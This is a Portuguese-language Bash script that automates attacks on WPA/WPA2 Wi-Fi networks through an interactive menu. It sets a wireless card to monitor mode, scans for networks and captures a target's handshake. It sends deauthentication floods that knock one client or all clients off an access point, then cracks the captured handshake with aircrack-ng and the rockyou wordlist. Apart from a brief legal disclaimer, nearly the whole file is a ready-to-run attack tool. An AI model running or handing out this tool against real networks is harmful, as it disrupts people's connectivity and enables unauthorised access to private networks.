#!/bin/bash

################################################################################
#                                                                              #
#  ██╗    ██╗██╗███████╗██╗     ██╗                                          #
#  ██║    ██║██║██╔════╝██║     ██║                                          #
#  ██║ █╗ ██║██║█████╗  ██║     ██║                                          #
#  ██║██╗╚██║██║██╔══╝  ██║     ██║                                          #
#  ╚███╔███╔╝██║██║     ███████╗███████╗                                     #
#   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝                                     #
#                                                                              #
#  CAPTURA DE HANDSHAKE WIFI - WPA/WPA2                                      #
#  Versão: 1.0                                                                 #
#  Data: $(date +%d/%m/%Y)                                                     #
#                                                                              #
#  ⚠️  AVISO LEGAL: USE APENAS COM AUTORIZAÇÃO FORMAL POR ESCRITO!          #
#  Este script é apenas para fins educacionais e testes autorizados.         #
#                                                                              #
################################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Configurações globais
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="${SCRIPT_DIR}/capturas"
WORDLIST_DIR="/usr/share/wordlists"
DEFAULT_WORDLIST="${WORDLIST_DIR}/rockyou.txt"

# Variáveis globais
INTERFACE=""
MONITOR_INTERFACE=""
BSSID=""
CHANNEL=""
ESSID=""
CAPTURE_FILE=""
CLIENT_MAC=""

################################################################################
# FUNÇÕES AUXILIARES
################################################################################

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  ██╗    ██╗██╗███████╗██╗     ██╗
  ██║    ██║██║██╔════╝██║     ██║
  ██║ █╗ ██║██║█████╗  ██║     ██║
  ██║██╗╚██║██║██╔══╝  ██║     ██║
  ╚███╔███╔╝██║██║     ███████╗███████╗
   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}Captura de Handshake WPA/WPA2${NC}"
    echo -e "${RED}⚠️  USE APENAS COM AUTORIZAÇÃO!${NC}\n"
}

# Verificar se está rodando como root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Este script precisa ser executado como root (sudo)${NC}"
        exit 1
    fi
}

# Verificar dependências
check_dependencies() {
    local missing=0
    
    echo -e "${BLUE}[*] Verificando dependências...${NC}"
    
    for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng iwconfig; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[!] $tool não encontrado${NC}"
            missing=1
        fi
    done
    
    if [[ $missing -eq 1 ]]; then
        echo -e "${YELLOW}[*] Instalando aircrack-ng...${NC}"
        apt-get update && apt-get install -y aircrack-ng
    else
        echo -e "${GREEN}[+] Todas as dependências estão instaladas${NC}"
    fi
}

# Detectar interface Wi-Fi
detect_interface() {
    echo -e "${BLUE}[*] Detectando interfaces Wi-Fi...${NC}"
    
    local interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$')
    
    if [[ -z "$interfaces" ]]; then
        echo -e "${RED}[!] Nenhuma interface Wi-Fi encontrada${NC}"
        exit 1
    fi
    
    echo -e "${CYAN}Interfaces disponíveis:${NC}"
    local count=1
    local if_array=()
    
    for iface in $interfaces; do
        if [[ "$iface" != "lo" ]]; then
            echo -e "${GREEN}  [$count] $iface${NC}"
            if_array+=("$iface")
            ((count++))
        fi
    done
    
    if [[ ${#if_array[@]} -eq 1 ]]; then
        INTERFACE=${if_array[0]}
        echo -e "${GREEN}[+] Usando interface: $INTERFACE${NC}"
    else
        echo -ne "${YELLOW}[?] Escolha a interface (1-${#if_array[@]}): ${NC}"
        read choice
        if [[ $choice -ge 1 && $choice -le ${#if_array[@]} ]]; then
            INTERFACE=${if_array[$((choice-1))]}
            echo -e "${GREEN}[+] Interface selecionada: $INTERFACE${NC}"
        else
            echo -e "${RED}[!] Escolha inválida${NC}"
            exit 1
        fi
    fi
}

# Detectar interface monitor criada
detect_monitor_interface() {
    local base_interface="$1"
    local monitor_iface=""
    
    # Aguardar um pouco para a interface ser criada
    sleep 3
    
    # Método 1: Verificar saída do airmon-ng
    local airmon_output=$(airmon-ng 2>/dev/null | grep -i "monitor mode" | awk '{print $2}')
    if [[ -n "$airmon_output" ]]; then
        for iface in $airmon_output; do
            if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
                monitor_iface="$iface"
                break
            fi
        done
    fi
    
    # Método 2: Verificar todas as interfaces em modo monitor
    if [[ -z "$monitor_iface" ]]; then
        local all_interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$')
        for iface in $all_interfaces; do
            if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
                # Verificar se está relacionada à interface base
                if [[ "$iface" == *"$base_interface"* ]] || [[ "$iface" == "mon"* ]]; then
                    monitor_iface="$iface"
                    break
                fi
            fi
        done
    fi
    
    # Método 3: Tentar variações comuns
    if [[ -z "$monitor_iface" ]]; then
        local variations=(
            "${base_interface}mon"
            "${base_interface}mon0"
            "${base_interface}mon1"
            "mon0"
            "mon1"
            "wlan0mon"
            "wlan1mon"
        )
        
        for iface in "${variations[@]}"; do
            if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
                monitor_iface="$iface"
                break
            fi
        done
    fi
    
    # Método 4: Listar todas as interfaces e pedir ao usuário
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${YELLOW}[!] Não foi possível detectar automaticamente a interface monitor${NC}"
        echo -e "${BLUE}[*] Interfaces disponíveis:${NC}"
        
        local count=1
        local if_array=()
        local all_ifaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$' | grep -v 'lo')
        
        for iface in $all_ifaces; do
            local mode=$(iwconfig "$iface" 2>/dev/null | grep -oP 'Mode:\K\w+' || echo "Unknown")
            echo -e "${CYAN}  [$count] $iface (Mode: $mode)${NC}"
            if_array+=("$iface")
            ((count++))
        done
        
        if [[ ${#if_array[@]} -gt 0 ]]; then
            echo -ne "${YELLOW}[?] Escolha a interface monitor (1-${#if_array[@]}): ${NC}"
            read choice
            if [[ $choice -ge 1 && $choice -le ${#if_array[@]} ]]; then
                monitor_iface="${if_array[$((choice-1))]}"
            fi
        fi
    fi
    
    echo "$monitor_iface"
}

# Colocar interface em modo monitor
enable_monitor_mode() {
    echo -e "${BLUE}[*] Colocando interface em modo monitor...${NC}"
    
    # Verificar se já está em modo monitor
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${GREEN}[+] Interface já está em modo monitor${NC}"
        MONITOR_INTERFACE="$INTERFACE"
        return 0
    fi
    
    # Matar processos que podem interferir
    echo -e "${YELLOW}[*] Matando processos que podem interferir...${NC}"
    airmon-ng check kill &> /dev/null
    
    sleep 2
    
    # Iniciar modo monitor
    echo -e "${YELLOW}[*] Iniciando modo monitor em $INTERFACE...${NC}"
    local airmon_result=$(airmon-ng start "$INTERFACE" 2>&1)
    
    # Mostrar saída do airmon-ng para debug
    if echo "$airmon_result" | grep -qi "error\|failed\|not found"; then
        echo -e "${RED}[!] Erro ao iniciar modo monitor:${NC}"
        echo "$airmon_result"
    fi
    
    sleep 2
    
    # Detectar interface monitor criada
    MONITOR_INTERFACE=$(detect_monitor_interface "$INTERFACE")
    
    if [[ -z "$MONITOR_INTERFACE" ]]; then
        echo -e "${RED}[!] Falha ao detectar interface monitor${NC}"
        echo -e "${YELLOW}[*] Tentando listar todas as interfaces...${NC}"
        iwconfig 2>/dev/null | grep -E "^[a-z]|Mode:"
        exit 1
    fi
    
    # Verificar se a interface realmente existe e está em modo monitor
    if ! iwconfig "$MONITOR_INTERFACE" &> /dev/null; then
        echo -e "${RED}[!] Interface monitor não existe: $MONITOR_INTERFACE${NC}"
        exit 1
    fi
    
    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $MONITOR_INTERFACE não está em modo monitor${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Modo monitor ativado: $MONITOR_INTERFACE${NC}"
    iwconfig "$MONITOR_INTERFACE" | grep -i mode
    echo -e "${CYAN}[*] Interface monitor confirmada e pronta para uso${NC}"
}

# Escanear redes Wi-Fi
scan_networks() {
    echo -e "${BLUE}[*] Escaneando redes Wi-Fi...${NC}"
    echo -e "${YELLOW}[*] Pressione Ctrl+C quando encontrar a rede alvo${NC}\n"
    
    sleep 2
    
    # Criar diretório de capturas
    mkdir -p "$OUTPUT_DIR"
    
    # Executar airodump-ng
    airodump-ng $MONITOR_INTERFACE
}

# Capturar handshake específico
capture_handshake() {
    echo -e "\n${BLUE}[*] Configurando captura de handshake...${NC}"
    
    # Solicitar informações da rede
    echo -ne "${YELLOW}[?] BSSID do AP (ex: 34:CE:00:7F:91:E0): ${NC}"
    read BSSID
    
    echo -ne "${YELLOW}[?] Canal (CH): ${NC}"
    read CHANNEL
    
    echo -ne "${YELLOW}[?] Nome da rede (ESSID) [opcional]: ${NC}"
    read ESSID
    
    echo -ne "${YELLOW}[?] MAC do cliente específico [opcional, Enter para todos]: ${NC}"
    read CLIENT_MAC
    
    # Nome do arquivo de captura
    CAPTURE_FILE="${OUTPUT_DIR}/captura_${TIMESTAMP}"
    
    echo -e "\n${GREEN}[+] Iniciando captura...${NC}"
    echo -e "${CYAN}Arquivo: ${CAPTURE_FILE}.cap${NC}"
    echo -e "${YELLOW}[*] Aguardando handshake... (abra outro terminal para executar deauth)${NC}\n"
    
    # Construir comando airodump-ng
    local cmd="airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE"
    
    if [[ -n "$ESSID" ]]; then
        cmd="$cmd --essid $ESSID"
    fi
    
    # Executar em background para poder mostrar instruções
    $cmd &
    local airodump_pid=$!
    
    echo -e "${GREEN}[+] Airodump-ng rodando (PID: $airodump_pid)${NC}"
    echo -e "${YELLOW}[*] Para forçar reconexão, execute em outro terminal:${NC}"
    if [[ -n "$CLIENT_MAC" ]]; then
        echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT_MAC $MONITOR_INTERFACE${NC}\n"
    else
        echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID $MONITOR_INTERFACE${NC}\n"
    fi
    
    echo -e "${YELLOW}[*] Ou execute esta função novamente para fazer deauth automático${NC}"
    echo -e "${YELLOW}[*] Pressione Enter quando capturar o handshake...${NC}"
    read
    
    # Parar airodump-ng
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null
    
    # Verificar se capturou handshake
    check_handshake
}

# Verificar se handshake foi capturado
check_handshake() {
    echo -e "\n${BLUE}[*] Verificando se handshake foi capturado...${NC}"
    
    local cap_file="${CAPTURE_FILE}-01.cap"
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] Arquivo de captura não encontrado${NC}"
        return 1
    fi
    
    # Verificar com aircrack-ng
    local result=$(aircrack-ng "$cap_file" 2>&1 | grep -i "handshake\|1 handshake")
    
    if [[ -n "$result" ]]; then
        echo -e "${GREEN}[+] ✓ Handshake capturado com sucesso!${NC}"
        echo -e "${GREEN}[+] Arquivo: $cap_file${NC}"
        return 0
    else
        echo -e "${RED}[!] Handshake não encontrado no arquivo${NC}"
        echo -e "${YELLOW}[*] Tente executar o ataque deauth novamente${NC}"
        return 1
    fi
}

# Executar ataque deauth
execute_deauth() {
    if [[ -z "$BSSID" ]]; then
        echo -e "${RED}[!] Execute a captura primeiro${NC}"
        return 1
    fi
    
    # Verificar se interface monitor ainda existe e está ativa
    if [[ -z "$MONITOR_INTERFACE" ]] || ! iwconfig "$MONITOR_INTERFACE" &> /dev/null; then
        echo -e "${YELLOW}[!] Interface monitor não encontrada, tentando detectar...${NC}"
        MONITOR_INTERFACE=$(detect_monitor_interface "$INTERFACE")
        
        if [[ -z "$MONITOR_INTERFACE" ]] || ! iwconfig "$MONITOR_INTERFACE" &> /dev/null; then
            echo -e "${RED}[!] Não foi possível encontrar interface monitor${NC}"
            echo -e "${YELLOW}[*] Interfaces disponíveis:${NC}"
            iwconfig 2>/dev/null | grep -E "^[a-z]|Mode:"
            return 1
        fi
    fi
    
    # Verificar se está em modo monitor
    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $MONITOR_INTERFACE não está em modo monitor${NC}"
        echo -e "${YELLOW}[*] Tentando reativar modo monitor...${NC}"
        enable_monitor_mode
    fi
    
    echo -e "${BLUE}[*] Executando ataque deauth...${NC}"
    echo -e "${CYAN}[*] Interface monitor: $MONITOR_INTERFACE${NC}"
    echo -e "${CYAN}[*] BSSID: $BSSID${NC}"
    
    local deauth_count=10
    echo -ne "${YELLOW}[?] Número de pacotes deauth [10]: ${NC}"
    read input
    if [[ -n "$input" ]]; then
        deauth_count=$input
    fi
    
    if [[ -n "$CLIENT_MAC" ]]; then
        echo -e "${YELLOW}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
        echo -e "${GREEN}[+] Executando: aireplay-ng --deauth $deauth_count -a $BSSID -c $CLIENT_MAC $MONITOR_INTERFACE${NC}\n"
        aireplay-ng --deauth $deauth_count -a "$BSSID" -c "$CLIENT_MAC" "$MONITOR_INTERFACE"
    else
        echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
        echo -e "${GREEN}[+] Executando: aireplay-ng --deauth $deauth_count -a $BSSID $MONITOR_INTERFACE${NC}\n"
        aireplay-ng --deauth $deauth_count -a "$BSSID" "$MONITOR_INTERFACE"
    fi
    
    echo -e "\n${GREEN}[+] Ataque deauth concluído${NC}"
    echo -e "${YELLOW}[*] Verifique se o handshake foi capturado${NC}"
}

# Quebrar handshake com wordlist
crack_handshake() {
    if [[ -z "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] Nenhum arquivo de captura definido${NC}"
        return 1
    fi
    
    local cap_file="${CAPTURE_FILE}-01.cap"
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] Arquivo de captura não encontrado: $cap_file${NC}"
        return 1
    fi
    
    echo -e "${BLUE}[*] Quebrando handshake com wordlist...${NC}"
    
    # Verificar wordlist
    local wordlist="$DEFAULT_WORDLIST"
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${YELLOW}[*] Wordlist padrão não encontrada${NC}"
        echo -ne "${YELLOW}[?] Caminho da wordlist: ${NC}"
        read wordlist
        
        if [[ ! -f "$wordlist" ]]; then
            echo -e "${RED}[!] Wordlist não encontrada${NC}"
            return 1
        fi
    else
        echo -ne "${YELLOW}[?] Usar wordlist padrão ($wordlist)? [S/n]: ${NC}"
        read use_default
        if [[ "$use_default" =~ ^[Nn] ]]; then
            echo -ne "${YELLOW}[?] Caminho da wordlist: ${NC}"
            read wordlist
            if [[ ! -f "$wordlist" ]]; then
                echo -e "${RED}[!] Wordlist não encontrada${NC}"
                return 1
            fi
        fi
    fi
    
    echo -e "${GREEN}[+] Usando wordlist: $wordlist${NC}"
    echo -e "${YELLOW}[*] Isso pode levar muito tempo...${NC}\n"
    
    # Executar aircrack-ng
    if [[ -n "$BSSID" ]]; then
        aircrack-ng -w "$wordlist" -b "$BSSID" "$cap_file"
    else
        aircrack-ng -w "$wordlist" "$cap_file"
    fi
}

# Restaurar interface ao modo normal
restore_interface() {
    echo -e "\n${BLUE}[*] Restaurando interface ao modo normal...${NC}"
    
    if [[ -n "$MONITOR_INTERFACE" ]]; then
        airmon-ng stop $MONITOR_INTERFACE &> /dev/null
        echo -e "${GREEN}[+] Interface restaurada${NC}"
    fi
    
    # Reiniciar NetworkManager se disponível
    if command -v systemctl &> /dev/null; then
        systemctl start NetworkManager &> /dev/null 2>&1
    fi
}

# Menu principal
show_menu() {
    echo -e "\n${CYAN}${BOLD}=== MENU PRINCIPAL ===${NC}\n"
    echo -e "${GREEN}[1]${NC} Escanear redes Wi-Fi"
    echo -e "${GREEN}[2]${NC} Capturar handshake (rede específica)"
    echo -e "${GREEN}[3]${NC} Executar ataque deauth"
    echo -e "${GREEN}[4]${NC} Verificar handshake capturado"
    echo -e "${GREEN}[5]${NC} Quebrar handshake com wordlist"
    echo -e "${GREEN}[6]${NC} Restaurar interface"
    echo -e "${RED}[0]${NC} Sair"
    echo -ne "\n${YELLOW}[?] Escolha uma opção: ${NC}"
}

################################################################################
# FUNÇÃO PRINCIPAL
################################################################################

main() {
    show_banner
    check_root
    check_dependencies
    
    # Trap para restaurar interface ao sair
    trap restore_interface EXIT INT TERM
    
    detect_interface
    enable_monitor_mode
    
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                scan_networks
                ;;
            2)
                capture_handshake
                ;;
            3)
                execute_deauth
                ;;
            4)
                check_handshake
                ;;
            5)
                crack_handshake
                ;;
            6)
                restore_interface
                enable_monitor_mode
                ;;
            0)
                echo -e "${GREEN}[+] Saindo...${NC}"
                restore_interface
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Opção inválida${NC}"
                ;;
        esac
        
        echo -e "\n${YELLOW}[*] Pressione Enter para continuar...${NC}"
        read
    done
}

# Executar script
main

